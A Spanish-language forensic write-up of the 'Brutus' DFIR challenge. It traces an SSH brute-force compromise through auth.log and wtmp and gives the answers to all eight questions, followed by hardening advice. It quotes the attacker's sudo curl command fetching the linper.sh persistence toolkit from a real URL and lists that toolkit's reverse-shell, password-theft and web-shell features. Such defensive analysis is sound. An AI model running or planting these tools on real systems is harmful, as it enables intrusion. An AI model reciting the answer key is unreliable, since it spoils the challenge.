Brutus — Brute Force Attack Investigation

Investigación forense de un ataque de fuerza bruta contra servicios de autenticación. Análisis de logs de autenticación, identificación de patrones de ataque, correlación de IPs maliciosas y reconstrucción de la timeline del ataque.

Descripción del Reto

Brutus es un reto introductorio de DFIR centrado en el análisis de logs de autenticación en Linux. El escenario involucra un servidor Confluence que fue objetivo de un ataque de fuerza bruta SSH, resultando en un compromiso completo con privilegios de root. Una vez dentro, el atacante estableció dos mecanismos de persistencia: una cuenta de usuario local como backdoor y la descarga de un toolkit automatizado de persistencia.

La investigación se basa en dos artefactos clásicos de Linux — auth.log y el archivo binario wtmp — que juntos permiten reconstruir la línea de tiempo completa del ataque: desde el primer paquete de fuerza bruta hasta el último comando ejecutado por el atacante.

💡
Concepto clave — auth.log vs wtmp: auth.log registra eventos de autenticación (intentos de contraseña, apertura/cierre de sesiones, comandos sudo). wtmp es un archivo binario que registra sesiones interactivas completadas — captura el momento en que el terminal PTY se establece realmente, lo que puede diferir del timestamp de autenticación.
📄
auth.log
Log de autenticación PAM en Linux. Captura intentos SSH, creación de sesiones, ejecución de sudo y operaciones sobre cuentas.
🗂️
wtmp
Base de datos binaria de logins (formato UTMP). Se analiza con utmpdump o last -f wtmp. Registra inicio y fin de sesiones interactivas.

Análisis Forense de Logs

El análisis requiere parsear y correlacionar entradas de dos fuentes de log complementarias. Cada una ofrece una perspectiva distinta del mismo ataque.

📋 auth.log — Eventos de Autenticación

Fuente principal para identificar el origen de la fuerza bruta, el éxito de la autenticación y la actividad post-explotación.

📄 auth.log — entradas clave
# Entradas de fuerza bruta — cientos de estas Mar 6 06:31:31 server sshd[2411]: Invalid user admin from 65.2.161.68 Mar 6 06:31:33 server sshd[2411]: Failed password for root from 65.2.161.68 # Éxito de la fuerza bruta Mar 6 06:31:40 server sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2 # Creación de la cuenta backdoor Mar 6 06:34:18 server useradd[2502]: new user: name=cyberjunkie, uid=1002, gid=1002 ... # Sesión PAM #37 asignada a root Mar 6 06:32:44 server sshd[2411]: pam_unix(sshd:session): session opened for user root by (uid=0) # Cierre de primera sesión Mar 6 06:37:24 server sshd[2411]: pam_unix(sshd:session): session closed for user root # Comando sudo de cyberjunkie Mar 6 06:39:38 server sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

🗂️ wtmp — Registros de Sesión (Binario → Texto)

wtmp captura la sesión interactiva real, de ahí que su timestamp difiera del de auth.log. Se analiza con utmpdump o last -F -f wtmp.

⚠️
Por qué difieren los timestamps de auth.log y wtmp: auth.log registra cuándo PAM autentica al usuario. wtmp registra cuándo el terminal interactivo (PTY) queda completamente establecido. El atacante se autenticó a las 06:31:40, pero la sesión interactiva manual no fue registrada por wtmp hasta las 06:32:45 — un delta de ~65 segundos.
💻 Comando Linux — parsear wtmp
# Convertir wtmp binario a texto legible utmpdump /var/log/wtmp # Alternativa con timestamps completos last -F -f wtmp # Resultado para la sesión del atacante: # root pts/0 65.2.161.68 Wed Mar 6 06:32:45 2024

linper.sh — Toolkit de Persistencia en Linux

El último comando malicioso ejecutado por el atacante fue la descarga con privilegios sudo de linper.sh, un toolkit de automatización de persistencia en Linux alojado en GitHub (github.com/montysecurity/linper). Aunque fue diseñado originalmente para uso en CTF y red team, el atacante lo utilizó para establecer múltiples mecanismos de persistencia de forma simultánea.

Comando Malicioso Ejecutado
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
🛠️ linper.sh — Capacidades de Persistencia

El toolkit enumera los binarios disponibles y los vectores de persistencia del sistema, instalando automáticamente reverse shells y backdoors a través de múltiples mecanismos.

⏰ Persistencia por Crontab
Instala reverse shells como cron jobs que se ejecutan en intervalos programados y sobreviven reinicios del sistema.
🔐 Secuestro de Contraseñas sudo
Inyecta una función en ~/.bashrc para interceptar y exfiltrar contraseñas sudo de forma silenciosa.
🌐 Despliegue de Web Shell
Coloca reverse shells PHP en directorios del servidor web (Apache/Nginx) si tienen permisos de escritura.
👁️ Enumeración de /etc/shadow
Comprueba si /etc/shadow es legible para exfiltrar hashes de contraseñas y proceder con cracking offline.
🥷 Modo Sigiloso
Aplica técnicas de ofuscación para ocultar los backdoors instalados ante revisiones manuales del sistema.
🔄 Función de Limpieza
Incluye una función de eliminación que borra toda la persistencia instalada, borrando rastros bajo demanda.
🚨
Contexto de amenaza: El atacante ya contaba con acceso persistente mediante la cuenta backdoor cyberjunkie. La descarga de linper.sh indica la intención de establecer múltiples mecanismos de persistencia adicionales, lo que complica enormemente la respuesta al incidente: habría que auditar todos los crontabs, archivos bashrc y directorios web del servidor.

Resolución de Tareas

Resolución completa de las 8 preguntas del reto con metodología forense detallada.

1
Analiza el archivo auth.log. ¿Cuál es la dirección IP que utilizó el atacante para realizar el ataque de fuerza bruta?
Respuesta 65.2.161.68
Filtrando auth.log por entradas repetidas de "Failed password" e "Invalid user" desde una única IP, se identifica 65.2.161.68 como el origen del ataque. El volumen y la velocidad de los intentos fallidos son la firma característica de un ataque de fuerza bruta SSH.
2
Los intentos de fuerza bruta tuvieron éxito y el atacante obtuvo acceso a una cuenta. ¿Cuál es el nombre de usuario de esa cuenta?
Respuesta root
Entrada en auth.log: Accepted password for root from 65.2.161.68. El atacante apuntó directamente a la cuenta con máximos privilegios, lo cual es habitual cuando el servicio SSH está expuesto a Internet sin políticas de bloqueo de cuentas ni fail2ban.
3
Identifica el timestamp UTC en el que el atacante inició sesión manualmente en el servidor y estableció una sesión de terminal interactiva. Difiere del tiempo de autenticación y se encuentra en el artefacto wtmp.
Respuesta 2024-03-06 06:32:45
Extraído del archivo wtmp con utmpdump. El delta de 65 segundos entre auth.log (06:31:40) y wtmp (06:32:45) representa el tiempo transcurrido entre la aceptación de credenciales y el momento en que el atacante establece activamente el terminal interactivo PTY.
4
Las sesiones SSH se rastrean y se les asigna un número al iniciar sesión. ¿Cuál es el número de sesión asignado a la sesión del atacante para la cuenta de la Pregunta 2?
Respuesta 37
Encontrado en auth.log mediante las entradas de gestión de sesiones PAM. PAM asigna IDs de sesión secuenciales — buscando la sesión root asociada a 65.2.161.68 se obtiene el ID de sesión 37. Este ID permite correlacionar todos los eventos ocurridos dentro de la misma sesión de login.
5
El atacante añadió un nuevo usuario como parte de su estrategia de persistencia y le otorgó privilegios elevados. ¿Cómo se llama esa cuenta?
Respuesta cyberjunkie
auth.log registra un evento useradd para el usuario cyberjunkie iniciado desde la sesión root comprometida. La cuenta fue añadida también al grupo sudo (privilegios elevados), proporcionando al atacante una segunda vía de acceso incluso si se cambia la contraseña de root.
6
¿Cuál es el ID de subtécnica MITRE ATT&CK utilizado para la persistencia mediante la creación de una nueva cuenta?
Respuesta T1136.001
T1136 — Create Account / T1136.001 — Local Account. Los adversarios crean cuentas locales para mantener acceso persistente. Dado que la cuenta backdoor dispone de privilegios sudo, proporciona acceso equivalente a root de forma funcional, convirtiéndola en un mecanismo de persistencia de alto valor que sobrevive al reseteo de contraseñas en la cuenta comprometida originalmente.
7
¿A qué hora finalizó la primera sesión SSH del atacante según auth.log?
Respuesta 2024-03-06 06:37:24
auth.log registra un evento de cierre de sesión PAM para la sesión root en este timestamp. La primera sesión duró aproximadamente 4 minutos y 44 segundos — tiempo suficiente para crear la cuenta backdoor y explorar el entorno antes de desconectarse y volver a entrar mediante la cuenta cyberjunkie.
8
El atacante volvió a iniciar sesión en su cuenta backdoor y utilizó sus privilegios para descargar un script. ¿Cuál es el comando completo ejecutado con sudo?
Respuesta /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
auth.log captura las invocaciones completas de comandos sudo, incluyendo la ruta completa y los argumentos. El atacante usó los privilegios sudo de cyberjunkie para descargar linper.sh directamente desde GitHub usando curl. La ruta completa /usr/bin/curl es necesaria para la ejecución con sudo.

Detección y Hardening

🚫 Deshabilitar Login SSH como Root
Configurar PermitRootLogin no en /etc/ssh/sshd_config. Toda la cadena de ataque dependía de poder autenticarse directamente como root.
🔑 Autenticación por Clave SSH
Deshabilitar autenticación por contraseña (PasswordAuthentication no). La autenticación por clave es inmune a los ataques de fuerza bruta.
🛡️ Implementar fail2ban
Bloquear automáticamente IPs tras N intentos fallidos. La fuerza bruta tuvo éxito en menos de 10 segundos — fail2ban con umbral de 5 intentos habría bloqueado el ataque antes de que tuviera éxito.
📊 Monitorizar useradd / usermod
Alertar sobre cualquier creación de cuenta local o cambio en membresías de grupos fuera de ventanas de cambio aprobadas. La detección de T1136.001 debe ser una regla base en el SIEM.
🌐 Filtrado de Tráfico Saliente
Bloquear solicitudes curl/wget a dominios no autorizados desde procesos del servidor. La descarga de linper.sh requería HTTP saliente a raw.githubusercontent.com — controlable a nivel de red.
🔍 Centralizar auth.log en SIEM
Enviar auth.log a un SIEM centralizado en tiempo real. Reglas de detección clave: pico de "Failed password", "Accepted password for root", y comandos sudo invocando curl/wget/bash.
